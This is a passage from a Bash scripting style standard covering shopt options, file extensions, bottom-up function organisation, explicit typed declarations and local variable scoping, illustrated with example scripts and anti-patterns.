  install myapp.conf.example "$PREFIX/etc/myapp/myapp.conf"
\`\`\`

**Edge cases:**

**1. PREFIX with trailing slash:**

\`\`\`bash
# Handle PREFIX with or without trailing slash
PREFIX="${PREFIX:-/usr/local}"
PREFIX="${PREFIX%/}"  # Remove trailing slash if present
BIN_DIR="$PREFIX/bin"
\`\`\`

**2. User install without sudo:**

\`\`\`bash
# Detect if user has write permissions
if [[ ! -w "$PREFIX" ]]; then
  warn "No write permission to $PREFIX"
  info "Try: PREFIX=\$HOME/.local make install"
  die 5 'Permission denied'
fi
\`\`\`

**3. Library path for runtime:**

\`\`\`bash
# Some systems need LD_LIBRARY_PATH for custom locations
if [[ -d "$PREFIX/lib/myapp" ]]; then
  export LD_LIBRARY_PATH="$PREFIX/lib/myapp${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
fi
\`\`\`

**4. Symlink vs real path:**

\`\`\`bash
# If script is symlinked to /usr/local/bin, SCRIPT_DIR resolves to actual location
# This is correct - we want the real installation directory, not the symlink location
SCRIPT_PATH=$(realpath -- "$0")  # Resolves symlinks
SCRIPT_DIR=${SCRIPT_PATH%/*}

# Now SCRIPT_DIR points to actual install location, not /usr/local/bin
\`\`\`

**When NOT to use FHS:**

- **Single-user scripts**: Scripts only used by one user don't need FHS
- **Project-specific tools**: Build scripts, test runners that stay in project directory
- **Container applications**: Docker containers often use app-specific paths like `/app`
- **Embedded systems**: Limited systems may use custom layouts

**Summary:**

- **Follow FHS** for scripts that install system-wide or distribute to users
- **Use PREFIX** to support custom installation locations
- **Search multiple locations** for resources (development, local, system, user)
- **Separate file types**: bin/ for executables, share/ for data, etc/ for config, lib/ for libraries
- **Support XDG** for user-specific files (`XDG_CONFIG_HOME`, `XDG_DATA_HOME`)
- **Preserve user config** on upgrades (don't overwrite existing files)
- **Make PREFIX customizable** via environment variable

**Key principle:** FHS compliance makes scripts portable, predictable, and compatible with package managers. Design scripts to work in development mode and multiple install scenarios without modification.


---


**Rule: BCS0105**

### shopt

**Recommended settings for most scripts:**

```bash
# STRONGLY RECOMMENDED - apply to all scripts
shopt -s inherit_errexit  # Critical: makes set -e work in subshells,
                          # command substitutions
shopt -s shift_verbose    # Catches shift errors when no arguments remain
shopt -s extglob          # Enables extended glob patterns like !(*.txt)

# CHOOSE ONE based on use case:
shopt -s nullglob   # For arrays/loops: unmatched globs → empty (no error)
                # OR
shopt -s failglob   # For strict scripts: unmatched globs → error

# OPTIONAL based on needs:
shopt -s globstar   # Enable ** for recursive matching (slow on deep trees)
```

**Detailed rationale for each setting:**

**`inherit_errexit` (CRITICAL):**
- **Without it**: `set -e` does NOT apply inside command substitutions or subshells
- **With it**: Errors in `$(...)` and `(...)` properly propagate
- **Example of the problem:**
```bash
set -e  # Without inherit_errexit
result=$(false)  # This does NOT exit the script!
echo "Still running"  # This executes

# With inherit_errexit
shopt -s inherit_errexit
result=$(false)  # Script exits here as expected
```

**`shift_verbose`:**
- **Without it**: `shift` silently fails when no arguments remain, continues execution
- **With it**: Prints error message when shift fails (respects `set -e`)
- **Example:**
```bash
shopt -s shift_verbose
shift  # If no arguments: "bash: shift: shift count must be <= $#"
```

**`extglob`:**
- **Enables advanced pattern matching** that regular globs cannot do
- **Patterns enabled**: `?(pattern)`, `*(pattern)`, `+(pattern)`, `@(pattern)`, `!(pattern)`
- **Example use cases:**
```bash
shopt -s extglob

# Delete everything EXCEPT .txt files
rm !(*.txt)

# Match files with multiple extensions
cp *.@(jpg|png|gif) /destination/

# Match one or more digits
[[ $input == +([0-9]) ]] && echo "Number"
```

**`nullglob` vs `failglob` (Choose one):**

**`nullglob`:**
- **Best for**: Scripts that process file lists in loops/arrays
- **Behavior**: Unmatched glob expands to empty string (no error)
- **Example:**
```bash
shopt -s nullglob
for file in *.txt; do  # If no .txt files, loop body never executes
  echo "$file"
done

files=(*.log)  # If no .log files: files=() (empty array)
```

**`failglob`:**
- **Best for**: Strict scripts where unmatched glob indicates an error
- **Behavior**: Unmatched glob causes error (respects `set -e`)
- **Example:**
```bash
shopt -s failglob
cat *.conf  # If no .conf files: "bash: no match: *.conf" (exits with set -e)
```

**Without either (default bash behavior):**
```bash
# ✗ Dangerous default behavior
for file in *.txt; do  # If no .txt files, $file = literal string "*.txt"
  rm "$file"  # Tries to delete file named "*.txt"!
done
```

**`globstar` (OPTIONAL):**
- **Enables `**` for recursive directory matching** (like `find`)
- **Warning**: Can be slow on deep directory trees
- **Example:**
```bash
shopt -s globstar

# Recursively find all .sh files
for script in **/*.sh; do
  shellcheck "$script"
done

# Equivalent to: find . -name '*.sh' -type f
```

**Typical script configuration:**
```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob
```

**When NOT to use these settings:**
- **Interactive scripts**: May want more lenient behavior
- **Legacy compatibility**: Older bash versions may not support all options
- **Performance-critical loops**: `globstar` can be slow on large trees


---


**Rule: BCS0106**

### File Extensions
- Executables should have `.sh` extension or no extension
- Libraries must have `.sh` extension and should not be executable
- Libraries that can also be executed as scripts can have either `.sh` or no extension
- If the executable will be available globally via PATH, always use no extension


---


**Rule: BCS0107**

### Function Organization

**Always organize functions bottom-up: lowest-level primitives first (messaging, utilities), then composition layers, ending with `main()` as the highest-level orchestrator. This pattern makes scripts readable, maintainable, and eliminates forward reference issues.**

**Rationale:**

- **No Forward References**: Bash reads top-to-bottom; defining functions in dependency order ensures all called functions exist before use
- **Readability**: Readers understand primitives first, then see how they're composed into complex operations
- **Debugging Efficiency**: When debugging, you can read from top down and understand dependencies immediately
- **Maintainability**: Clear dependency hierarchy makes it obvious where to add new functions
- **Testability**: Low-level functions can be tested independently before testing higher-level compositions
- **Cognitive Load**: Understanding small pieces first, then compositions reduces mental overhead

**Standard 7-layer organization pattern:**

```bash
#!/bin/bash
set -euo pipefail

# 1. Messaging functions (lowest level - used by everything)
_msg() { ... }
success() { >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
info() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }

# 2. Documentation functions (no dependencies)
show_help() { ... }

# 3. Helper/utility functions (used by validation and business logic)
yn() { ... }
noarg() { ... }

# 4. Validation functions (check prerequisites, dependencies)
check_root() { ... }
check_prerequisites() { ... }
check_builtin_support() { ... }

# 5. Business logic functions (domain-specific operations)
build_standalone() { ... }
build_builtin() { ... }
install_standalone() { ... }
install_builtin() { ... }
install_completions() { ... }
update_man_database() { ... }

# 6. Orchestration/flow functions
show_completion_message() { ... }
uninstall_files() { ... }

# 7. Main function (highest level - orchestrates everything)
main() {
  check_root
  check_prerequisites

  if ((UNINSTALL)); then
    uninstall_files
    return 0
  fi

  build_standalone
  ((INSTALL_BUILTIN)) && build_builtin

  install_standalone
  install_completions
  ((INSTALL_BUILTIN)) && install_builtin

  update_man_database
  show_completion_message
}

main "$@"
#fin
```

**Key principle of bottom-up organization:**

Each function can safely call functions defined ABOVE it (earlier in the file). Dependencies flow downward: higher functions call lower functions, never upward.

\`\`\`
Top of file
     ↓
[Layer 1: Messaging] ← Can call nothing (primitives)
     ↓
[Layer 2: Documentation] ← Can call Layer 1
     ↓
[Layer 3: Utilities] ← Can call Layers 1-2
     ↓
[Layer 4: Validation] ← Can call Layers 1-3
     ↓
[Layer 5: Business Logic] ← Can call Layers 1-4
     ↓
[Layer 6: Orchestration] ← Can call Layers 1-5
     ↓
[Layer 7: main()] ← Can call all layers
     ↓
main "$@" invocation
#fin
\`\`\`

**Detailed layer descriptions:**

**Layer 1: Messaging functions (lowest primitives)**
- `_msg()`, `info()`, `warn()`, `error()`, `die()`, `success()`, `debug()`, `vecho()`
- **Purpose**: Output messages to user
- **Dependencies**: None (pure I/O)
- **Used by**: Everything

**Layer 2: Documentation functions**
- `show_help()`, `show_version()`, `show_usage()`
- **Purpose**: Display help text and usage information
- **Dependencies**: May use messaging functions
- **Used by**: Argument parsing, main()

**Layer 3: Helper/utility functions**
- `yn()`, `noarg()`, `trim()`, `s()`, `decp()`
- **Purpose**: Generic utilities usable anywhere
- **Dependencies**: May use messaging
- **Used by**: Validation, business logic

**Layer 4: Validation functions**
- `check_root()`, `check_prerequisites()`, `validate_input()`, `check_dependencies()`
- **Purpose**: Verify preconditions and input
- **Dependencies**: Utilities, messaging
- **Used by**: main(), business logic

**Layer 5: Business logic functions**
- Domain-specific operations: `build_project()`, `process_file()`, `deploy_app()`
- **Purpose**: Core functionality of the script
- **Dependencies**: All lower layers
- **Used by**: Orchestration, main()

**Layer 6: Orchestration functions**
- `run_build_phase()`, `run_deploy_phase()`, `cleanup()`
- **Purpose**: Coordinate multiple business logic functions
- **Dependencies**: Business logic, validation
- **Used by**: main()

**Layer 7: main() function**
- **Purpose**: Top-level script flow
- **Dependencies**: Can call any function
- **Used by**: Script invocation line

**Complete example showing full organization:**

\`\`\`bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Global variables
declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -- BUILD_DIR='/tmp/build'

# ============================================================================
# Layer 1: Messaging functions
# ============================================================================

_msg() {
  local -- func="${FUNCNAME[1]}"
  echo "[$func] $*"
}

info() {
  >&2 _msg "$@"
}

warn() {
  >&2 _msg "WARNING: $*"
}

error() {
  >&2 _msg "ERROR: $*"
}

die() {
  local -i exit_code=$1
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}

success() {
  >&2 _msg "SUCCESS: $*"
}

debug() {
  ((VERBOSE)) && >&2 _msg "DEBUG: $*"
  return 0
}

# ============================================================================
# Layer 2: Documentation functions
# ============================================================================

show_version() {
  echo "$SCRIPT_NAME $VERSION"
}

show_help() {
  cat << EOF
Usage: $SCRIPT_NAME [OPTIONS]

Build and deploy application.

Options:
  -v, --verbose   Enable verbose output
  -n, --dry-run   Dry-run mode (no changes)
  -h, --help      Show this help
  -V, --version   Show version

Version: $VERSION
EOF
}

# ============================================================================
# Layer 3: Helper/utility functions
# ============================================================================

yn() {
  local -- prompt="${1:-Continue?}"
  local -- response

  while true; do
    read -rp "$prompt [y/n] " response
    case "$response" in
      [Yy]*) return 0 ;;
      [Nn]*) return 1 ;;
      *) warn 'Please answer y or n' ;;
    esac
  done
}

noarg() {
  (($# < 2)) && die 2 "Option $1 requires an argument"
}

# ============================================================================
# Layer 4: Validation functions
# ============================================================================

check_prerequisites() {
  info 'Checking prerequisites...'

  # Check required commands
  local -- cmd
  for cmd in git make tar; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      die 1 "Required command not found: $cmd"
    fi
  done

  # Check build directory writable
  if [[ ! -w "${BUILD_DIR%/*}" ]]; then
    die 5 "Cannot write to build directory: $BUILD_DIR"
  fi

  success 'Prerequisites check passed'
}

validate_config() {
  info 'Validating configuration...'

  # Check config file exists
  [[ -f 'config.conf' ]] || die 2 'Configuration file not found: config.conf'

  # Validate config contents
  source 'config.conf'

  [[ -n "${APP_NAME:-}" ]] || die 22 'APP_NAME not set in config'
  [[ -n "${APP_VERSION:-}" ]] || die 22 'APP_VERSION not set in config'

  debug "App: $APP_NAME $APP_VERSION"
  success 'Configuration validated'
}

# ============================================================================
# Layer 5: Business logic functions
# ============================================================================

clean_build_dir() {
  info "Cleaning build directory: $BUILD_DIR"

  if ((DRY_RUN)); then
    info '[DRY-RUN] Would remove build directory'
    return 0
  fi

  if [[ -d "$BUILD_DIR" ]]; then
    rm -rf "$BUILD_DIR"
    debug "Removed: $BUILD_DIR"
  fi

  install -d "$BUILD_DIR"
  success "Build directory ready: $BUILD_DIR"
}

compile_sources() {
  info 'Compiling sources...'

  if ((DRY_RUN)); then
    info '[DRY-RUN] Would compile sources'
    return 0
  fi

  # Compile logic here
  make -C src all BUILD_DIR="$BUILD_DIR"

  success 'Sources compiled'
}

run_tests() {
  info 'Running tests...'

  if ((DRY_RUN)); then
    info '[DRY-RUN] Would run tests'
    return 0
  fi

  # Test logic here
  make -C tests all

  success 'Tests passed'
}

create_package() {
  info 'Creating package...'
  local -- package_file="$BUILD_DIR/app.tar.gz"

  if ((DRY_RUN)); then
    info "[DRY-RUN] Would create package: $package_file"
    return 0
  fi

  tar -czf "$package_file" -C "$BUILD_DIR" .
  success "Package created: $package_file"
}

# ============================================================================
# Layer 6: Orchestration functions
# ============================================================================

run_build_phase() {
  info 'Starting build phase...'

  clean_build_dir
  compile_sources
  run_tests

  success 'Build phase complete'
}

run_package_phase() {
  info 'Starting package phase...'

  create_package

  success 'Package phase complete'
}

# ============================================================================
# Layer 7: Main function (highest level)
# ============================================================================

main() {
  # Parse arguments (simplified for example)
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    -h|--help)    show_help; exit 0 ;;
    -V|--version) show_version; exit 0 ;;
    -*)           die 22 "Invalid option: $1" ;;
    *)            die 2 "Unexpected argument: $1" ;;
  esac; shift; done

  # Set readonly after argument parsing
  readonly -- VERBOSE DRY_RUN

  info "Starting $SCRIPT_NAME $VERSION"
  ((DRY_RUN)) && info 'DRY-RUN MODE ENABLED'

  # Validate environment
  check_prerequisites
  validate_config

  # Execute phases in order
  run_build_phase
  run_package_phase

  success "$SCRIPT_NAME completed successfully"
}

main "$@"

#fin
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ Wrong - main() at the top (forward references required)
main() {
  build_project  # build_project not defined yet!
  deploy_app     # deploy_app not defined yet!
}

build_project() { ... }
deploy_app() { ... }

# ✓ Correct - main() at bottom
build_project() { ... }
deploy_app() { ... }

main() {
  build_project
  deploy_app
}

# ✗ Wrong - business logic before utilities it calls
process_file() {
  validate_input "$1"  # validate_input not defined yet!
  # ...
}

validate_input() { ... }

# ✓ Correct - utilities before business logic
validate_input() { ... }

process_file() {
  validate_input "$1"
  # ...
}

# ✗ Wrong - random/alphabetical organization ignoring dependencies
cleanup() { ... }
build() { ... }
check_deps() { ... }
main() { ... }

# ✓ Correct - dependency-ordered organization
check_deps() { ... }  # No dependencies
build() { check_deps; ... }  # Depends on check_deps
cleanup() { ... }  # No dependencies
main() { build; cleanup; }  # Depends on all

# ✗ Wrong - messaging functions scattered throughout
info() { ... }
build() { ... }
warn() { ... }
deploy() { ... }
error() { ... }

# ✓ Correct - all messaging together at top
info() { ... }
warn() { ... }
error() { ... }
die() { ... }

build() { ... }
deploy() { ... }

# ✗ Wrong - circular dependencies (A calls B, B calls A)
function_a() {
  # ...
  function_b  # Calls B
}

function_b() {
  # ...
  function_a  # Calls A - circular dependency!
}

# ✓ Correct - extract common logic to lower-level function
common_logic() {
  # Shared code
}

function_a() {
  common_logic
  # A-specific code
}

function_b() {
  common_logic
  # B-specific code
}
\`\`\`

**Guidelines for within-layer ordering:**

**1. Within Layer 1 (Messaging):**
Order by severity/importance:
- `_msg()` (core utility)
- `info()`
- `success()`
- `debug()`/`vecho()`
- `warn()`
- `error()`
- `die()` (terminates script)

**2. Within Layer 3 (Helpers):**
Order alphabetically or by frequency of use:
- Most commonly used first
- Or alphabetically for easy lookup

**3. Within Layer 4 (Validation):**
Order by execution sequence:
- Functions called early in script first
- Or alphabetically

**4. Within Layer 5 (Business Logic):**
Order by logical workflow:
- Functions representing sequential steps in order
- Or group related operations together

**Edge cases and special considerations:**

**1. Circular dependencies:**

\`\`\`bash
# Problem: Function A needs B, but B needs A

# Solution 1: Extract common logic to lower layer
shared_validation() {
  # Common validation used by both
}

function_a() {
  shared_validation
  # A-specific logic
}

function_b() {
  shared_validation
  # B-specific logic
}

# Solution 2: Restructure to eliminate circular dependency
# Often indicates design issue - rethink function responsibilities
\`\`\`

**2. Optional functions (sourced libraries):**

\`\`\`bash
# When sourcing libraries, they may define functions
# Place source statements after your messaging layer

# Messaging functions
info() { ... }
warn() { ... }
error() { ... }
die() { ... }

# Source library (may define additional utilities)
source "$SCRIPT_DIR/lib/common.sh"

# Your utilities
# (Can now use both your messaging AND library functions)
validate_email() { ... }
\`\`\`

**3. Private functions:**

\`\`\`bash
# Functions prefixed with _ are private/internal
# Place in same layer as public functions that use them

# Layer 1: Messaging
_msg() { ... }  # Private core utility
info() { >&2 _msg "$@"; }  # Public wrapper

# Layer 3: Utilities
_internal_parser() { ... }  # Private helper
parse_config() { _internal_parser "$@"; }  # Public interface
\`\`\`

**Summary:**

- **Always organize bottom-up**: messaging → utilities → validation → business logic → orchestration → main()
- **Group functions** with section comments (e.g., `# Layer 3: Utilities`)
- **Dependencies flow downward**: higher functions call lower functions, never upward
- **Within each layer**: order alphabetically or by logical sequence
- **main() is always last** before invocation
- **Avoid circular dependencies**: extract common logic to lower layer
- **Use section comments** to visually separate layers

**Key principle:** Bottom-up organization mirrors how programmers think: understand primitives first, then compositions. This pattern eliminates forward reference issues and makes scripts immediately understandable to readers.


---


**Rule: BCS0201**

### Type-Specific Declarations

**Always use explicit type declarations (`declare -i`, `declare --`, `declare -a`, `declare -A`) to make variable intent clear and enable type-safe operations. Explicit typing prevents bugs, improves readability, and enables bash's built-in type checking.**

**Rationale:**

- **Type Safety**: Integer declarations (`-i`) automatically enforce numeric operations and catch non-numeric assignments
- **Intent Documentation**: Explicit types serve as inline documentation showing how the variable will be used
- **Array Safety**: Array declarations prevent accidental scalar assignment that would break array operations
- **Scope Control**: `declare` and `local` provide precise variable scoping (global vs function-local)
- **Performance**: Type-specific operations are faster than string-based operations
- **Error Prevention**: Type mismatches are caught early rather than causing subtle bugs later

**All declaration types:**

**1. Integer variables (`declare -i`)**

**Purpose**: Variables that will hold only numeric values and participate in arithmetic operations.

\`\`\`bash
# Declare integer variable
declare -i count=0
declare -i exit_code=1
declare -i port=8080

# Automatic arithmetic evaluation
count=count+1  # Same as: ((count+=1))
count='5 + 3'  # Evaluates to 8, not string "5 + 3"

# Type enforcement
count='abc'  # Evaluates to 0 (non-numeric becomes 0)
echo "$count"  # Output: 0
\`\`\`

**When to use:**
- Counters, loop indices
- Exit codes
- Port numbers
- Numeric flags (though consider using `declare -i FLAG=0` or `declare -i FLAG=1`)
- Any variable used in arithmetic operations

**Benefits:**
- Automatic arithmetic evaluation (no need for `$(())` in some contexts)
- Type checking (non-numeric values become 0)
- Clear intent that variable holds numbers

**2. String variables (`declare --`)**

**Purpose**: Variables that hold text strings. The `--` separator prevents option injection.

\`\`\`bash
# Declare string variables
declare -- filename='data.txt'
declare -- user_input=''
declare -- config_path="/etc/app/config.conf"

# ` --` prevents option injection if variable name starts with -
declare -- var_name='-weird'  # Without --, this would be interpreted as option
\`\`\`

**When to use:**
- File paths
- User input
- Configuration values
- Any text data
- Default choice for most variables

**Benefits:**
- Explicit intent that variable holds text
- `--` separator prevents option injection bugs
- Clear distinction from integers and arrays

**3. Indexed arrays (`declare -a`)**

**Purpose**: Ordered lists indexed by integers (0, 1, 2, ...).

\`\`\`bash
# Declare indexed array
declare -a files=()
declare -a args=('one' 'two' 'three')
declare -a paths

# Add elements
files+=('file1.txt')
files+=('file2.txt')

# Access elements
echo "${files[0]}"  # file1.txt
echo "${files[@]}"  # All elements
echo "${#files[@]}"  # Count: 2

# Iterate
for file in "${files[@]}"; do
  process "$file"
done
\`\`\`

**When to use:**
- Lists of items (files, arguments, options)
- Command arrays for safe execution
- Any sequential collection
- Anytime you need to iterate over multiple values

**Benefits:**
- Safe word splitting (quoted expansion preserves spaces)
- Clear intent that variable is a list
- Prevents accidental scalar assignment

**4. Associative arrays (`declare -A`)**

**Purpose**: Key-value maps (hash tables, dictionaries).

\`\`\`bash
# Declare associative array
declare -A config=(
  [app_name]='myapp'
  [app_port]='8080'
  [app_host]='localhost'
)

declare -A user_data=()

# Add/modify elements
user_data[name]='Alice'
user_data[email]='alice@example.com'

# Access elements
echo "${config[app_name]}"  # myapp
echo "${!config[@]}"  # All keys
echo "${config[@]}"  # All values

# Check if key exists
if [[ -v "config[app_port]" ]]; then
  echo "Port configured: ${config[app_port]}"
fi

# Iterate over keys
for key in "${!config[@]}"; do
  echo "$key = ${config[$key]}"
done
\`\`\`

**When to use:**
- Configuration data (key-value pairs)
- Dynamic function dispatch
- Caching/memoization
- Any data organized by named keys rather than numeric indices

**Benefits:**
- Clear key-value relationship
- Fast lookups by key
- Replaces need for multiple scalar variables

**5. Read-only constants (`readonly --`)**

**Purpose**: Variables that should never change after initialization.

\`\`\`bash
# Declare constants
readonly -- VERSION='1.0.0'
readonly -i MAX_RETRIES=3
readonly -a ALLOWED_ACTIONS=('start' 'stop' 'restart' 'status')

# Attempt to modify (will fail)
VERSION='2.0.0'  # bash: VERSION: readonly variable

# Verify readonly status
readonly -p | grep VERSION
# Output: declare -r VERSION="1.0.0"
\`\`\`

**When to use:**
- VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME
- Configuration values that shouldn't change
- Magic numbers/strings
- Validated user input (after validation, make readonly)

**Benefits:**
- Prevents accidental modification
- Self-documenting (signals immutability)
- Defensive programming

**6. Local variables in functions (`local`)**

**Purpose**: Variables scoped to function, not visible outside.

\`\`\`bash
process_file() {
  local -- filename="$1"
  local -i line_count
  local -a lines

  # These variables don't exist outside this function
  line_count=$(wc -l < "$filename")
  readarray -t lines < "$filename"

  echo "Processed $line_count lines"
}

# filename, line_count, lines don't exist here
\`\`\`

**When to use:**
- ALL function parameters
- ALL temporary variables in functions
- Variables that shouldn't leak to global scope

**Benefits:**
- Prevents global namespace pollution
- Avoids variable collision between functions
- Clear scoping (function-local vs global)

**Combining type and scope:**

\`\`\`bash
# Global integer
declare -i GLOBAL_COUNT=0

function count_files() {
  local -- dir="$1"
  local -i file_count
  local -a files

  # Local integer variable
  file_count=0

  # Local array
  files=("$dir"/*)

  for file in "${files[@]}"; do
    [[ -f "$file" ]] && ((file_count+=1))
  done

  echo "$file_count"
}

# Global array
declare -a PROCESSED_FILES=()

# Global associative array
declare -A FILE_STATUS=()

# Global readonly
readonly -- CONFIG_FILE='config.conf'
\`\`\`

**Complete example showing all types:**

\`\`\`bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Integer variables
declare -i VERBOSE=0
declare -i ERROR_COUNT=0
declare -i MAX_RETRIES=3

# String variables
declare -- LOG_FILE="/var/log/$SCRIPT_NAME.log"
declare -- CONFIG_FILE="$SCRIPT_DIR/config.conf"

# Indexed arrays
declare -a FILES_TO_PROCESS=()
declare -a FAILED_FILES=()

# Associative arrays
declare -A CONFIG=(
  [timeout]='30'
  [retries]='3'
  [verbose]='false'
)

declare -A FILE_CHECKSUMS=()

# ============================================================================
# Color Definitions
# ============================================================================

if [[ -t 1 && -t 2 ]]; then
  readonly -- RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  readonly -- RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi

# ============================================================================
# Utility Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    warn)    prefix+=" ${YELLOW}⚡${NC}" ;;
    success) prefix+=" ${GREEN}✓${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# ============================================================================
# Business Logic Functions
# ============================================================================

# Function with local typed variables
process_file() {
  local -- input_file="$1"
  local -i attempt=0
  local -i success=0
  local -- checksum

  while ((attempt < MAX_RETRIES && !success)); do
    ((attempt+=1))

    info "Processing $input_file (attempt $attempt)"

    if process_command "$input_file"; then
      success=1
      checksum=$(sha256sum "$input_file" | cut -d' ' -f1)
      FILE_CHECKSUMS["$input_file"]="$checksum"
      info "Success: $input_file ($checksum)"
    else
      warn "Failed: $input_file (attempt $attempt/$MAX_RETRIES)"
      ((ERROR_COUNT+=1))
    fi
  done

  if ((success)); then
    return 0
  else
    FAILED_FILES+=("$input_file")
    return 1
  fi
}

main() {
  # Load files into array
  FILES_TO_PROCESS=("$SCRIPT_DIR"/data/*.txt)

  # Process each file
  local -- file
  for file in "${FILES_TO_PROCESS[@]}"; do
    process_file "$file"
  done

  # Report results
  info "Processed: ${#FILES_TO_PROCESS[@]} files"
  info "Errors: $ERROR_COUNT"
  info "Failed: ${#FAILED_FILES[@]} files"

  # Show checksums
  local -- filename
  for filename in "${!FILE_CHECKSUMS[@]}"; do
    info "Checksum: $filename = ${FILE_CHECKSUMS[$filename]}"
  done

  ((ERROR_COUNT == 0))  # Exit code: 0 if no errors, 1 if errors
}

main "$@"

#fin
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ Wrong - no type declaration (intent unclear)
count=0
files=()

# ✓ Correct - explicit type declarations
declare -i count=0
declare -a files=()

# ✗ Wrong - using strings for numeric operations
max_retries='3'
attempts='0'
if [[ "$attempts" -lt "$max_retries" ]]; then  # String comparison!

# ✓ Correct - use integers for numeric operations
declare -i max_retries=3
declare -i attempts=0
if ((attempts < max_retries)); then  # Numeric comparison

# ✗ Wrong - forgetting -A for associative arrays
declare CONFIG  # Creates scalar, not associative array
CONFIG[key]='value'  # Treats 'key' as 0, creates indexed array!

# ✓ Correct - explicit associative array declaration
declare -A CONFIG=()
CONFIG[key]='value'

# ✗ Wrong - global variables in functions
process_data() {
  temp_var="$1"  # Global variable leak!
  result=$(process "$temp_var")
}

# ✓ Correct - local variables in functions
process_data() {
  local -- temp_var="$1"
  local -- result
  result=$(process "$temp_var")
}

# ✗ Wrong - forgetting -- separator
declare filename='-weird'  # Interpreted as option!

# ✓ Correct - use -- separator
declare -- filename='-weird'

# ✗ Wrong - scalar assignment to array variable
declare -a files=()
files='file.txt'  # Overwrites array with scalar!

# ✓ Correct - array assignment
declare -a files=()
files=('file.txt')  # Array with one element
# Or
files+=('file.txt')  # Append to array

# ✗ Wrong - using readonly without type
readonly VAR='value'  # Type unclear

# ✓ Correct - combine readonly with type
readonly -- VAR='value'
readonly -i COUNT=10
readonly -a ACTIONS=('start' 'stop')
\`\`\`

**Edge cases:**

**1. Integer overflow:**

\`\`\`bash
declare -i big_number=9223372036854775807  # Max 64-bit signed int
((big_number+=1))
echo "$big_number"  # Wraps to negative!

# For very large numbers, use string or bc
declare -- big='99999999999999999999'
result=$(bc <<< "$big + 1")
\`\`\`

**2. Associative array requires Bash 4.0+:**

\`\`\`bash
# Check bash version
if ((BASH_VERSINFO[0] < 4)); then
  die 1 'Associative arrays require Bash 4.0+'
fi

declare -A config=()
\`\`\`

**3. Array assignment syntax:**

\`\`\`bash
# All of these create arrays correctly:
declare -a arr1=()           # Empty array
declare -a arr2=('a' 'b')    # Array with 2 elements
declare -a arr3              # Declare without initialization

# This creates scalar, not array:
declare -a arr4='string'     # arr4 is string 'string', not array!

# Correct array with single element:
declare -a arr5=('string')   # Array with one element
\`\`\`

**4. Local arrays in functions:**

\`\`\`bash
process_list() {
  # Both type and scope modifiers
  local -a files=()
  local -A status=()

  # Use arrays locally
  files=("$@")
  status[total]="${#files[@]}"
}
\`\`\`

**5. Nameref variables (Bash 4.3+):**

\`\`\`bash
# Pass array by reference
modify_array() {
  local -n arr_ref=$1  # Nameref to array

  arr_ref+=('new element')
}

declare -a my_array=('a' 'b')
modify_array my_array  # Pass name, not value
echo "${my_array[@]}"  # Output: a b new element
\`\`\`

**Summary:**

- **Use `declare -i`** for integer variables (counters, exit codes, ports)
- **Use `declare --`** for string variables (paths, text, user input)
- **Use `declare -a`** for indexed arrays (lists, sequences)
- **Use `declare -A`** for associative arrays (key-value maps, configs)
- **Use `readonly --`** for constants that shouldn't change
- **Use `local`** for ALL variables in functions (prevent global leaks)
- **Combine modifiers** when needed: `local -i`, `local -a`, `readonly -A`
- **Always use `--`** separator to prevent option injection

**Key principle:** Explicit type declarations serve as inline documentation and enable type checking. When you declare `declare -i count=0`, you're telling both Bash and future readers: "This variable holds an integer and will be used in arithmetic operations."


---


**Rule: BCS0202**

### Variable Scoping
Always declare function-specific variables as `local` to prevent namespace pollution and unexpected side effects.

```bash
# Global variables - declare at top
declare -i VERBOSE=1 PROMPT=1

# Function variables - always use local
main() {
  local -a add_specs=()      # Local array
  local -i max_depth=3       # Local integer
  local -- path              # Local string
  local -- dir
  dir=$(dirname -- "$name")
  # ...
}
```

**Rationale:** Without `local`, function variables become global and can:
1. **Overwrite global variables** with the same name
2. **Persist after function returns**, causing unexpected behavior
3. **Interfere with recursive function calls**

**Anti-pattern example:**
```bash
# ✗ Wrong - no local declaration
process_file() {
  file="$1"  # Overwrites any global $file variable!
  # ...
}

# ✓ Correct - local declaration
process_file() {
  local -- file="$1"  # Scoped to this function only
  # ...
}
```

**Common gotcha - recursive functions:**
```bash
# Without local, recursive functions break
count_files() {
  total=0  # ✗ Global! Each recursive call resets it
  for file in "$1"/*; do
    ((total++))
  done
  echo "$total"
}

# Correct version
count_files() {
  local -i total=0  # ✓ Each invocation gets its own total
  for file in "$1"/*; do
    ((total++))
  done
  echo "$total"
}
```


---


**Rule: BCS0203**

### Naming Conventions

Follow these naming conventions to maintain consistency and avoid conflicts with shell built-ins.

